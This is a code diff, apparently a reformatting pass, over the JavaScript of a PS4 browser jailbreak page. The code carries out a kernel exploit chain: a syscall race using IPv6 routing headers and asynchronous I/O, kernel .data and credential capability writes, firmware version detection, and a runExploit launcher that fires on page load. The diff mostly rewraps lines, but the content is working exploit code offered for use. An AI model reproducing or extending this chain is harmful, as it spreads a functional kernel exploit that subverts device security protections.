+                  (kpDone ? 1 : 0) +
+                  " payload_running=" +
+                  (plDone ? 1 : 0) +
+                  " armings=" +
+                  armCount +
+                  " jb_restored=" +
+                  (jbRestored ? 1 : 0) +
+                  "  (.data/.text/caps need a reboot; the refcounted handles do not)",
               );
               allDone = true;
             }
           }
         }
       }
-      const capsBack = CAPS_RESTORE && capsWrote > 0 ? 256 - capsWrote & 255 : 0;
+      const capsBack =
+        CAPS_RESTORE && capsWrote > 0 ? (256 - capsWrote) & 255 : 0;
       const mf3 = multiFire(
         [
           { kind: "sweep", step: O_RAN, probe: OID.add32(81), low: 16777215 },
-          { kind: "dec", addr: CAPS_B, n: capsBack }
+          { kind: "dec", addr: CAPS_B, n: capsBack },
         ],
-        "oid+0x54+caps-restore"
+        "oid+0x54+caps-restore",
       );
       if (mf3 === null) return;
       const ran = mf3[0];
       mark(
         "KF-RAN",
-        "oid+0x54=" + (ran.b < 0 ? "NO-MATCH" : "0x" + ran.b.toString(16)) + " cands=" + ran.n + " want=0x1"
+        "oid+0x54=" +
+          (ran.b < 0 ? "NO-MATCH" : "0x" + ran.b.toString(16)) +
+          " cands=" +
+          ran.n +
+          " want=0x1",
       );
       check(
         "KF-UNHIDE-LANDED",
         ran.b === 1 && ran.n === 1,
-        "oid+0x54=" + ran.b + " (1 => sysctl_root passed the visibility check, so the .data write at kern.file oid+0x50 landed)"
+        "oid+0x54=" +
+          ran.b +
+          " (1 => sysctl_root passed the visibility check, so the .data write at kern.file oid+0x50 landed)",
       );
-      let xfData = null, xfFile = null, kfSeen = 0;
+      let xfData = null,
+        xfFile = null,
+        kfSeen = 0;
       if (got && got.rv === 0 && got.len >= 80) {
-        const n = Math.min(got.len, KF_BYTES) / 80 | 0;
+        const n = (Math.min(got.len, KF_BYTES) / 80) | 0;
         for (let i = 0; i < n; i++) {
           const o = i * 80;
           kfSeen++;
@@ -4703,38 +5882,78 @@
           if (kfDv.getInt32(o + 16, true) !== kfSock) continue;
           xfFile = new int64(
             kfDv.getUint32(o + 24, true),
-            kfDv.getUint32(o + 28, true)
+            kfDv.getUint32(o + 28, true),
           );
           xfData = new int64(
             kfDv.getUint32(o + 56, true),
-            kfDv.getUint32(o + 60, true)
+            kfDv.getUint32(o + 60, true),
           );
           break;
         }
         mark(
           "KF-SCAN",
-          "entries=" + n + " seen=" + kfSeen + " pid=" + pid + " fd=" + kfSock + " xf_file=" + xfFile + " xf_data=" + xfData
+          "entries=" +
+            n +
+            " seen=" +
+            kfSeen +
+            " pid=" +
+            pid +
+            " fd=" +
+            kfSock +
+            " xf_file=" +
+            xfFile +
+            " xf_data=" +
+            xfData,
         );
         check("KF-SOCKET-NAMED", !!xfData, "xf_data=" + xfData);
       } else {
         mark(
           "KF-SCAN",
-          "skipped rv=" + after.rv + " errno=" + after.err + " reason=caps_gate_still_closed_as_predicted"
+          "skipped rv=" +
+            after.rv +
+            " errno=" +
+            after.err +
+            " reason=caps_gate_still_closed_as_predicted",
         );
       }
       mark(
         "KF-VERDICT",
-        "fw=" + fwKey + " kernel_base=" + KBASE + " anchor_confirmed=" + (on.v === KERN_FILE_NUM ? 1 : 0) + " unhide_landed=" + (ran.b === 1 ? 1 : 0) + " sysctl_rv=" + after.rv + " errno=" + after.err + " xf_data=" + (xfData ? xfData : "none") + " armings=" + armCount + " next=set_cr_sceCaps_bit62_ucred+0x64_bit30"
+        "fw=" +
+          fwKey +
+          " kernel_base=" +
+          KBASE +
+          " anchor_confirmed=" +
+          (on.v === KERN_FILE_NUM ? 1 : 0) +
+          " unhide_landed=" +
+          (ran.b === 1 ? 1 : 0) +
+          " sysctl_rv=" +
+          after.rv +
+          " errno=" +
+          after.err +
+          " xf_data=" +
+          (xfData ? xfData : "none") +
+          " armings=" +
+          armCount +
+          " next=set_cr_sceCaps_bit62_ucred+0x64_bit30",
       );
       mark(
         "KF-DATA-LEFT-DIRTY",
-        "oid+0x50 left nonzero and oid+0x51..0x54 perturbed by the sweep -- .data is reloaded from the boot image, so REBOOT clears it. No restore attempted on purpose."
+        "oid+0x50 left nonzero and oid+0x51..0x54 perturbed by the sweep -- .data is reloaded from the boot image, so REBOOT clears it. No restore attempted on purpose.",
       );
       {
-        const nodes = 256 + capsWrote + (CAPS_RESTORE && capsWrote > 0 ? 256 - capsWrote : 0);
+        const nodes =
+          256 +
+          capsWrote +
+          (CAPS_RESTORE && capsWrote > 0 ? 256 - capsWrote : 0);
         mark(
           "CAPS-COLLATERAL",
-          "caps67_nodes=" + nodes + " caps1_lo24_delta=-" + (nodes >> 8) + " exact=" + ((nodes & 255) === 0 ? 1 : 0) + " bits24_63=untouched kind=bitmask_not_pointer reboot=restores"
+          "caps67_nodes=" +
+            nodes +
+            " caps1_lo24_delta=-" +
+            (nodes >> 8) +
+            " exact=" +
+            ((nodes & 255) === 0 ? 1 : 0) +
+            " bits24_63=untouched kind=bitmask_not_pointer reboot=restores",
         );
       }
       allDone = true;
@@ -4742,11 +5961,20 @@
       setNode0(0, N0SINK);
       let renew = 0;
       for (const fd of POOL)
-        if (sc(SYS.setsockopt, fd, IPPROTO_IPV6, IPV6_RTHDR, pAd, RTH_SIZE).i32 === 0)
+        if (
+          sc(SYS.setsockopt, fd, IPPROTO_IPV6, IPV6_RTHDR, pAd, RTH_SIZE)
+            .i32 === 0
+        )
           renew++;
       mark(
         "PR-NEUTRALISE",
-        "next=0 on " + renew + "/" + POOL.length + "  armings_left_dangling=" + armCount + "  (workers deliberately NOT terminated: their td_proc is corrupt and terminate() would make them syscall)"
+        "next=0 on " +
+          renew +
+          "/" +
+          POOL.length +
+          "  armings_left_dangling=" +
+          armCount +
+          "  (workers deliberately NOT terminated: their td_proc is corrupt and terminate() would make them syscall)",
       );
       const drWbAb = new ArrayBuffer(NBLOCK * 64);
       keepAlive2.push(drWbAb);
@@ -4765,12 +5993,18 @@
       }
       mark(
         "PR-GATE",
-        "poll=" + drGatePoll + " ok=" + (drGate ? 1 : 0) + " st=[" + drGateSt + "] rule=every_race_id_terminal_or_gone"
+        "poll=" +
+          drGatePoll +
+          " ok=" +
+          (drGate ? 1 : 0) +
+          " st=[" +
+          drGateSt +
+          "] rule=every_race_id_terminal_or_gone",
       );
       if (!drGate) {
         mark(
           "PR-DRAIN-SKIPPED",
-          "a race request is still live -- workers NOT released"
+          "a race request is still live -- workers NOT released",
         );
       } else {
         const drWr = sc(SYS.write, bsp1, bufAddr(drWbAb), NBLOCK * 64).i32;
@@ -4785,11 +6019,23 @@
         }
         let drSt = "";
         for (let k = 0; k < NBLOCK; k++)
-          drSt += (k ? "," : "") + (drStDv.getUint32(k * 4, true) >>> 0).toString(16);
+          drSt +=
+            (k ? "," : "") + (drStDv.getUint32(k * 4, true) >>> 0).toString(16);
         const drDel = sc(SYS.aio_multi_delete, drBidAd, NBLOCK, drStAd).i32;
         mark(
           "PR-DRAIN",
-          "wr=" + drWr + " done=" + drDone + "/" + NBLOCK + " spins=" + drSpins + " st=[" + drSt + "] del=" + drDel
+          "wr=" +
+            drWr +
+            " done=" +
+            drDone +
+            "/" +
+            NBLOCK +
+            " spins=" +
+            drSpins +
+            " st=[" +
+            drSt +
+            "] del=" +
+            drDel,
         );
       }
     } catch (e) {
@@ -4799,7 +6045,7 @@
       try {
         if (jbRestoreHook) jbRestoreHook("finally");
       } catch (e5) {
-        mark("JB-RESTORE-THREW", e5 && e5.message || String(e5));
+        mark("JB-RESTORE-THREW", (e5 && e5.message) || String(e5));
       }
       try {
         if (opened.length && closeFd && mainArmed) {
@@ -4808,12 +6054,12 @@
           mark("STRAGGLERS-CLOSED", n + "/" + opened.length);
         }
       } catch (e3) {
-        mark("CLOSE-THREW", e3 && e3.message || String(e3));
+        mark("CLOSE-THREW", (e3 && e3.message) || String(e3));
       }
       try {
         if (pinRestore) pinRestore();
       } catch (e4) {
-        mark("PIN-RESTORE-THREW", e4 && e4.message || String(e4));
+        mark("PIN-RESTORE-THREW", (e4 && e4.message) || String(e4));
       }
       try {
         if (mainArmed && mainMf && mainOrig && p) {
@@ -4822,21 +6068,24 @@
           mark("EXPM1-RESTORED", "expm1(1)=" + Math.expm1(1));
         }
       } catch (e2) {
-        mark("DISARM-THREW", e2 && e2.message || String(e2));
+        mark("DISARM-THREW", (e2 && e2.message) || String(e2));
       }
       try {
         if (typeof A !== "undefined" && A) A.busy = 0;
-      } catch (e) {
-      }
+      } catch (e) {}
       mark(
         "PROOF-SUMMARY-FINAL",
-        "pass=" + passCount + " fail=" + failCount + (allDone ? "" : "  INCOMPLETE")
+        "pass=" +
+          passCount +
+          " fail=" +
+          failCount +
+          (allDone ? "" : "  INCOMPLETE"),
       );
       if (payloadRunning || allDone) {
         exploitSuccess();
       } else {
         setStatus(
-          '<span style="color: #ef4444;">Jailbreak failed. Please restart your console.</span>'
+          '<span style="color: #ef4444;">Jailbreak failed. Please restart your console.</span>',
         );
       }
     }
@@ -4848,14 +6097,14 @@
     1302: 1,
     1304: 1,
     1350: 1,
-    1352: 1
+    1352: 1,
   };
   function checkAndDisplayFirmware() {
     var ua = navigator.userAgent;
     var match = /PlayStation\s+4[\/ ](\d+)\.(\d+)/.exec(ua);
     if (!match) {
       setStatus(
-        "Firmware: <b>Unknown</b> &middot; <span style='color: #ef4444;'>Not a PS4 Browser</span>"
+        "Firmware: <b>Unknown</b> &middot; <span style='color: #ef4444;'>Not a PS4 Browser</span>",
       );
       return { detected: false, raw: null, fwnum: null, supported: false };
     }
@@ -4871,18 +6120,22 @@
     var supported = forced || SUPPORTED_FIRMWARES[fwnum] === 1;
     if (supported) {
       setStatus(
-        "Firmware: <b>v" + rawVersion + "</b> &middot; <span style='color: #22c55e;'>Supported \u2714</span>"
+        "Firmware: <b>v" +
+          rawVersion +
+          "</b> &middot; <span style='color: #22c55e;'>Supported \u2714</span>",
       );
     } else {
       setStatus(
-        "Firmware: <b>v" + rawVersion + "</b> &middot; <span style='color: #ef4444;'>Unsupported Firmware</span>"
+        "Firmware: <b>v" +
+          rawVersion +
+          "</b> &middot; <span style='color: #ef4444;'>Unsupported Firmware</span>",
       );
     }
     return {
       detected: true,
       raw: rawVersion,
       fwnum,
-      supported
+      supported,
     };
   }
   function sleep(ms) {
@@ -4894,8 +6147,7 @@
         localStorage.setItem(key, value);
         return true;
       }
-    } catch (e) {
-    }
+    } catch (e) {}
     return false;
   }
   function safeGetLocalStorage(key) {
@@ -4903,14 +6155,21 @@
       if (window.localStorage) {
         return localStorage.getItem(key);
       }
-    } catch (e) {
-    }
+    } catch (e) {}
     return null;
   }
-  window.onerror = function(message, source, lineno) {
-    var fileName = source ? source.substring(source.lastIndexOf("/") + 1) : "inline";
+  window.onerror = function (message, source, lineno) {
+    var fileName = source
+      ? source.substring(source.lastIndexOf("/") + 1)
+      : "inline";
     setTemporaryStatus(
-      '<span style="color: #ef4444;">Error [' + fileName + ":" + lineno + "]: " + message + "</span>"
+      '<span style="color: #ef4444;">Error [' +
+        fileName +
+        ":" +
+        lineno +
+        "]: " +
+        message +
+        "</span>",
     );
   };
   var defaultStatus = "Waiting for command...";
@@ -4958,58 +6217,59 @@
   }
   function setTemporaryStatus(text, delay) {
     setStatus(text);
-    setTimeout(function() {
+    setTimeout(function () {
       e_desc();
     }, delay || 3e3);
   }
   function initializeAppCache() {
     try {
       if (!window.applicationCache) return;
-      window.applicationCache.onprogress = function(event) {
+      window.applicationCache.onprogress = function (event) {
         var progressPercentage = Math.round(100 * (event.loaded / event.total));
         setStatus("Installing Offline Cache: " + progressPercentage + "%");
       };
-      window.applicationCache.oncached = function() {
-        setTimeout(function() {
+      window.applicationCache.oncached = function () {
+        setTimeout(function () {
           setStatus("Cache Installed Successfully \u2714");
         }, 1500);
         safeSetLocalStorage("cached", "yes");
-        setTimeout(function() {
+        setTimeout(function () {
           setStatus("Refreshing the page to apply updates...");
         }, 3e3);
-        setTimeout(function() {
+        setTimeout(function () {
           location.reload();
         }, 4500);
       };
-      window.applicationCache.onnoupdate = function() {
+      window.applicationCache.onnoupdate = function () {
         safeSetLocalStorage("cached", "yes");
       };
-      window.applicationCache.onerror = function() {
+      window.applicationCache.onerror = function () {
         safeSetLocalStorage("cached", "yes");
       };
-    } catch (err) {
-    }
+    } catch (err) {}
   }
   function startExploitChain() {
     setStatus("Starting the exploit chain. Please wait...");
     if (typeof runExploit === "function") {
-      setTimeout(function() {
+      setTimeout(function () {
         runExploit().catch((err) => {
           setStatus(
-            '<span style="color: #ef4444;">Exploit Error: ' + (err.message || err) + "</span>"
+            '<span style="color: #ef4444;">Exploit Error: ' +
+              (err.message || err) +
+              "</span>",
           );
         });
       }, 50);
     } else {
       setStatus(
-        '<span style="color: #ef4444;">Exploit function not found. Modules failed to load.</span>'
+        '<span style="color: #ef4444;">Exploit function not found. Modules failed to load.</span>',
       );
     }
   }
   function exploitSuccess() {
     setStatus("Exploit Successful.");
   }
-  window.addEventListener("load", function() {
+  window.addEventListener("load", function () {
     var fwResult = checkAndDisplayFirmware();
     sleep(500);
     if (fwResult.supported) {
